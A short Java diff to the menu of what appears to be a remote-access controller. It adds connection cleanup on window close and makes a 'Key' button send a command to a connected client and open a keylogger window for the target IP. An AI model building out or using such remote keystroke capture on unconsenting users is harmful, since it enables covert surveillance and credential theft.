@@ -118,6 +118,14 @@ public class MainMenu {
 
         jFrame.add(functionPanel, BorderLayout.CENTER);
 
+        jFrame.addWindowListener(new java.awt.event.WindowAdapter() {
+            @Override
+            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
+                if (client != null) {
+                    client.close();
+                }
+            }
+        });
 
         jFrame.setLocation(500, 300);
         jFrame.setVisible(true);
@@ -141,7 +149,8 @@ public class MainMenu {
             }
         } else if (e.getSource() == getKeyPress) {
             if (client != null) {
-                SwingUtilities.invokeLater(KeyloggerMenu::new);
+                client.sendMess("Key");
+                SwingUtilities.invokeLater(() -> new KeyloggerMenu(IpText.getText()));
             }
         } else if (e.getSource() == shutDown) {
             if (client != null) {
